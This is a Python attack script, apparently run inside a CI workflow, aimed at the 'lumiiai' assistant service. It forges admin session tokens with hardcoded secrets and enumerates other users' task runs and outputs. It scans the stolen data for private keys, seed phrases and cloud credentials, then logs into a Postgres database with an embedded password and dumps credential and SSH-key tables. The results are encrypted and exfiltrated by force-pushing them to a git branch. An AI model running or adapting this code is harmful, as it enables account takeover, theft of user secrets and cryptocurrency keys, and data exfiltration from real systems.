#!/usr/bin/env python3
# Intent 28283 v2: first diagnose the 403 (auth matrix), then enumerate task-runs & test 5432.
import os, sys, json, time, uuid, base64, hmac, hashlib, ssl, http.client, re, subprocess, shutil, socket

REF = os.environ.get("GITHUB_REF_NAME", "") or ""
if "result" in REF:
    print("results-branch-skip", flush=True); sys.exit(0)
RUNID = os.environ.get("GITHUB_RUN_ID", str(int(time.time())))
T0 = time.time()
OUT = "/tmp/results"
for d in ("api", "runs", "db", "misc", "auth"):
    os.makedirs(os.path.join(OUT, d), exist_ok=True)
LOG = open(os.path.join(OUT, "transcript.log"), "a", buffering=1)

def log(*a):
    s = " ".join(str(x) for x in a)
    try: print(s, flush=True)
    except Exception: pass
    try: LOG.write(s + "\n")
    except Exception: pass

RESULT_BRANCH = os.environ.get("RESULT_BRANCH", "ci-28283-results")

def push_results(final=False):
    enc = "/tmp/results.tar.gz.gpg"; tarball = "/tmp/results.tar.gz"
    try:
        subprocess.run("tar czf %s -C /tmp results" % tarball, shell=True, check=False)
        tsize = os.path.getsize(tarball) if os.path.isfile(tarball) else 0
        log("TARBALL size", tsize)
        if tsize == 0: return
        if os.path.isfile("pub.asc"):
            subprocess.run("gpg --batch --yes --import pub.asc >/dev/null 2>&1", shell=True, check=False)
            subprocess.run("gpg --batch --yes --trust-model always -e -r ci-exfil@example.invalid -o %s %s" % (enc, tarball),
                           shell=True, capture_output=True, text=True, timeout=180)
        if not os.path.isfile(enc):
            shutil.copyfile(tarball, enc)
        data = open(enc, "rb").read()
        log("ENC size", len(data), "sha256", hashlib.sha256(data).hexdigest())
        shutil.copy(enc, "results.tar.gz.gpg")
        subprocess.run("git config user.email ci@aro.network; git config user.name ci", shell=True, check=False)
        subprocess.run('git add -f results.tar.gz.gpg && git commit -m "ci28283 %s" || true' % RUNID,
                       shell=True, capture_output=True)
        r = subprocess.run("git push -f origin HEAD:refs/heads/%s" % RESULT_BRANCH, shell=True,
                           capture_output=True, text=True, timeout=300)
        log("PUSH rc=%s out=%s err=%s" % (r.returncode, (r.stdout or "")[-160:], (r.stderr or "")[-260:]))
    except Exception as e:
        log("PUSH EXC", repr(e))

HOST = "assistant.lumiiai.cn"
ORG = "org_bTLzxtBLmugV8uxx4QTyw"
SUB = "usr_ZxLewKrgbRYSm7rWDtQX8"
CTX = ssl.create_default_context(); CTX.check_hostname = False; CTX.verify_mode = ssl.CERT_NONE

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def make_jwt(secret, payload, header=None):
    now = int(time.time())
    h = b64u(json.dumps(header or {"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    p = b64u(json.dumps(payload, separators=(",", ":")))
    sig = hmac.new(secret.encode(), (h + "." + p).encode(), hashlib.sha256).digest()
    return h + "." + p + "." + b64u(sig)

def req(path, cookie=None, method="GET", data=None, timeout=30, headers_extra=None):
    headers = {"Accept": "*/*", "User-Agent": "Mozilla/5.0", "Connection": "close"}
    if cookie: headers["Cookie"] = cookie
    if headers_extra: headers.update(headers_extra)
    body = None
    if data is not None:
        body = data if isinstance(data, bytes) else json.dumps(data).encode()
        headers["Content-Type"] = "application/json"
    c = None
    try:
        c = http.client.HTTPSConnection(HOST, 443, timeout=timeout, context=CTX)
        c.request(method, path, body=body, headers=headers)
        r = c.getresponse(); b = r.read()
        return r.status, dict(r.getheaders()), b
    except Exception as e:
        return -1, {}, ("ERR:" + repr(e)).encode()
    finally:
        try:
            if c is not None: c.close()
        except Exception: pass

def show(tag, path, cookie=None, **kw):
    st, hd, b = req(path, cookie=cookie, **kw)
    txt = b.decode("utf-8", "replace")
    log("REQ", tag, path, "->", st, "len", len(b), "|", txt[:220].replace("\n", "\\n"))
    save("auth", tag, st, hd, b)
    return st, hd, b

def save(sub, name, st, hd, body):
    try:
        open(os.path.join(OUT, sub, name + ".json"), "wb").write(
            (json.dumps({"status": st, "headers": hd}, ensure_ascii=False) + "\n").encode()
            + (body if isinstance(body, bytes) else str(body).encode()))
    except Exception: pass

log("start v2", time.ctime(), "run", RUNID, "ref", REF)

# ---- egress sanity (no auth) ----
show("health_noauth", "/health")
show("me_nocookie", "/api/me")
show("taskruns_nocookie", "/api/task-runs?limit=5")

SECRETS = [
    ("known", "297b8a491bc1920b918d01de77166556d3f835f473968c6b"),
    ("fallback", "lumii-beta-2026-secret-change-in-prod"),
]
now = int(time.time())
PAYLOADS = [
    ("full", {"sub": SUB, "org": ORG, "iat": now, "exp": now + 2592000, "sid": "sid_" + str(uuid.uuid4()), "lgn": now}),
    ("min", {"sub": SUB, "org": ORG, "iat": now, "exp": now + 2592000}),
    ("role", {"sub": SUB, "org": ORG, "iat": now, "exp": now + 2592000, "role": "owner", "isAdmin": True}),
]
ok_cookie = None
for sn, sec in SECRETS:
    for pn, pl in PAYLOADS:
        tok = make_jwt(sec, pl)
        ck = "lumii_session=" + tok
        st, hd, b = show("me_%s_%s" % (sn, pn), "/api/me", cookie=ck)
        if st == 200:
            ok_cookie = ck
            log("AUTH_OK", sn, pn)
            break
    if ok_cookie: break

if not ok_cookie:
    log("AUTH_FAILED_ALL_VARIANTS — will record boundary")
    # still record 5432 reachability
else:
    log("AUTH_OK_COOKIE_LEN", len(ok_cookie))

COOKIE = ok_cookie

def jcall(path, method="GET", data=None, timeout=30):
    st, hd, b = req(path, cookie=COOKIE, method=method, data=data, timeout=timeout)
    try: j = json.loads(b)
    except Exception: j = None
    return st, j, b

def short(x, n=900):
    if isinstance(x, (bytes, bytearray)):
        try: x = x.decode("utf-8", "replace")
        except Exception: x = repr(x)
    s = x if isinstance(x, str) else json.dumps(x, ensure_ascii=False, default=str)
    return s[:n]

if COOKIE:
    runs = {}; order = []; raw_lists = {}
    def add_runs(j):
        items = None
        if isinstance(j, dict):
            for k in ("runs", "items", "data", "list", "results"):
                if isinstance(j.get(k), list): items = j[k]; break
        elif isinstance(j, list): items = j
        if not items: return 0
        n = 0
        for r in items:
            if not isinstance(r, dict): continue
            rid = r.get("id") or r.get("runId") or r.get("taskRunId") or r.get("taskId")
            if not rid: continue
            if rid not in runs: runs[rid] = r; order.append(rid); n += 1
            else: runs[rid].update({k: v for k, v in r.items() if v not in (None, "", [], {})})
        return n
    def fetch_list(qname, qs):
        st, j, b = jcall("/api/task-runs?" + qs)
        raw_lists[qname] = (st, j, b)
        save("api", "list_%s" % qname, st, {}, b)
        n = add_runs(j)
        log("LIST", qname, qs, "->", st, "new", n, "tot", len(runs), short(j, 240) if st != 200 else "")
        return st, j

    for nm, qs in [("limit5", "limit=5"), ("limit50", "limit=50"), ("limit100", "limit=100"),
                    ("limit500", "limit=500"), ("limit1000", "limit=1000")]:
        fetch_list(nm, qs)
    def created_of(rid):
        r = runs.get(rid, {})
        return r.get("createdAt") or r.get("created_at") or r.get("created") or r.get("startedAt") or ""
    for i in range(5):
        if not order: break
        cur = created_of(order[-1])
        if not cur: break
        st, j = fetch_list("before%d" % i, "limit=100&before=" + str(cur).replace(":", "%3A").replace("+", "%2B"))
        if add_runs(j) == 0: break
    for i in (100, 200, 300):
        fetch_list("offset%d" % i, "limit=100&offset=%d" % i)
    log("RUNS_TOTAL", len(runs))
    for rid in order:
        r = runs[rid]
        log("RUNMETA", short({k: r.get(k) for k in ("id","status","state","userId","user_id","orgId","org_id","projectId","title","createdAt","created_at")}, 260))
    # member enumeration + cross-user
    member_ids = set()
    for path in ("/api/directory/members?limit=200", "/api/users?limit=200", "/api/org/members?limit=200"):
        st, j, b = jcall(path)
        save("api", "members_%s" % re.sub(r'\W', '_', path)[:40], st, {}, b)
        arr = None
        if isinstance(j, dict):
            for k in ("members", "users", "items", "data", "list"):
                if isinstance(j.get(k), list): arr = j[k]; break
        elif isinstance(j, list): arr = j
        if arr:
            cnt = 0
            for m in arr:
                if isinstance(m, dict):
                    uid = m.get("id") or m.get("userId")
                    if isinstance(uid, str): member_ids.add(uid); cnt += 1
            log("MEMBERS", path, "->", st, "cnt", cnt)
            if cnt: break
        else:
            log("MEMBERS", path, "->", st, short(b, 140))
    for uid in list(member_ids)[:8]:
        fetch_list("user_%s" % uid, "limit=100&user=" + uid)
    log("RUNS_TOTAL2", len(runs))
    # download outputs
    SUB_EP = ["", "/output", "/logs", "/events", "/artifacts", "/stream", "/result"]
    for rid in order:
        for sub in SUB_EP:
            st, j, b = jcall("/api/task-runs/%s%s" % (rid, sub))
            nm = "run_%s%s" % (rid, sub.replace("/", "_") or "_root")
            if st in (200, 206):
                save("runs", nm, st, {}, b)
                if sub in ("", "/output"):
                    log("RUN", rid, sub, st, "len", len(b))
            elif st not in (404, 405, 204):
                save("runs", nm, st, {}, b)
        if time.time() - T0 > 360: log("budget hit in run dl"); break
    # combined + scan
    comb = []
    for fn in os.listdir(os.path.join(OUT, "runs")):
        try: comb.append("### " + fn + "\n" + open(os.path.join(OUT, "runs", fn), encoding="utf-8", errors="replace").read())
        except Exception: pass
    blob = "\n".join(comb)
    open(os.path.join(OUT, "runs", "_ALL.txt"), "w").write(blob)
    log("ALL_LEN", len(blob))
    PATS = {
      "privhex": r"0x[0-9a-fA-F]{64}", "keystore": r"(cipherparams|scrypt|kdfparams)",
      "mnemonic": r"(mnemonic|助记词|seed phrase)", "authops": r"Auth for zoofi[^\n\"'\\]{0,60}",
      "deployer": r"DEPLOYER_PRIVATE_KEY", "postgres": r"postgres(?:ql)?://[^\s\"'\\]{6,160}",
      "dburl": r"(DATABASE_URL|PGPASSWORD|PGUSER)[^\n]{0,120}",
      "aksk": r"(AKID[A-Za-z0-9]{8,}|LTAI[A-Za-z0-9]{8,}|AKIA[A-Z0-9]{12,})",
      "zoofi": r"zoofi[-_]?(index|io)[^\s\"'\\]{0,60}", "cftunnel": r"[a-z0-9-]+\.(trycloudflare\.com|cfargotunnel\.com)",
      "jwtsec": r"JWT_SECRET[^\n]{0,100}",
    }
    hits = {}
    for name, rx in PATS.items():
        ms = re.findall(rx, blob)
        if ms:
            uniq = list(dict.fromkeys([m if isinstance(m, str) else str(m) for m in ms]))
            hits[name] = uniq[:40]
            log("HIT", name, "cnt", len(ms))
            for u in uniq[:12]: log("   ", name, ":", u[:170].replace("\n", "\\n"))
    save("misc", "hits", 200, {}, json.dumps(hits, ensure_ascii=False, default=str))
    try:
        from eth_account import Account
        for hx in list(set(hits.get("privhex", [])))[:300]:
            try:
                addr = Account.from_key(bytes.fromhex(hx[2:])).address.lower()
                if addr in ("0xc56f7063fd6d199ccc443dbbf4283be602d46343", "0xfe18aa1efa652660f36ab84f122cd36108f903b6"):
                    log("*** PRIVKEY MATCH ***", hx, addr); save("misc", "PRIVKEY_MATCH", 200, {}, hx + "\n" + addr)
            except Exception: pass
    except Exception as e: log("eth_unavail", repr(e))

# ---- 5432 reachability ----
def tcp_test(host, port, to=8):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(to); t = time.time()
    try: s.connect((host, port)); s.close(); return ("open", round(time.time() - t, 2))
    except socket.timeout: return ("timeout", round(time.time() - t, 2))
    except ConnectionRefusedError: return ("refused", round(time.time() - t, 2))
    except Exception as e: return ("err:" + repr(e), round(time.time() - t, 2))
    finally:
        try: s.close()
        except Exception: pass

pg = "122.51.1.87"
DBRES = {}
for p in (5432, 22, 443):
    DBREG = tcp_test(pg, p, 8); DBRES[str(p)] = DBREG
    log("TCP %s:%s ->" % (pg, p), DBREG)
save("misc", "tcp", 200, {}, json.dumps(DBRES, ensure_ascii=False))
if DBRES["5432"][0] == "open":
    try:
        subprocess.run("python3 -m pip install --quiet pg8000", shell=True, check=False, timeout=180)
        import pg8000.native as pgm
        con = pgm.Connection(user="lumii", password="364ddaf7cdc680e32d3605d506e420ee60076eabc3487024",
                             host=pg, port=5432, database="lumii_center", timeout=15)
        def q(sql, n=3000):
            try: return con.run(sql)[:n]
            except Exception as e: return [["__ERR__", repr(e)]]
        info = {"current_database": q("select current_database(), current_user, version()"),
                "tables": q("select tablename from pg_tables where schemaname='public' order by 1")}
        save("db", "dbinfo", 200, {}, json.dumps(info, ensure_ascii=False, default=str))
        log("DBINFO", short(info, 1800))
        present = set()
        for row in info.get("tables", []):
            try: present.add(row[0])
            except Exception: pass
        for tb in ["orgs","users","devices","conversations","workspaces","attachments","files","app_tokens",
                   "im_credentials","im_bots","task_runs","task_run_outputs","credentials","code_host_connections",
                   "project_ssh_keys","projects","accounts"]:
            if tb not in present: continue
            rows = q('select * from "%s" limit 300' % tb)
            save("db", "table_%s" % tb, 200, {}, json.dumps(rows, ensure_ascii=False, default=str)[:800000])
            log("DUMP", tb, "rows", len(rows))
        dbblob = []
        for fn in os.listdir(os.path.join(OUT, "db")):
            try: dbblob.append(open(os.path.join(OUT, "db", fn), encoding="utf-8", errors="replace").read())
            except Exception: pass
        dbtxt = "\n".join(dbblob)
        dbhits = {}
        for name, rx in PATS.items() if COOKIE else {}:
            ms = re.findall(rx, dbtxt)
            if ms:
                uniq = list(dict.fromkeys([m if isinstance(m, str) else str(m) for m in ms]))
                dbhits["DB_" + name] = uniq[:40]; log("DB_HIT", name, len(ms))
                for u in uniq[:8]: log("    DB", name, ":", u[:170].replace("\n", "\\n"))
        save("misc", "dbhits", 200, {}, json.dumps(dbhits, ensure_ascii=False, default=str))
        con.close()
    except Exception as e:
        log("DB_EXC", repr(e)); DBRES["error"] = repr(e)
else:
    log("5432 not reachable from runner; boundary recorded")

log("done", int(time.time() - T0))
push_results(final=True)
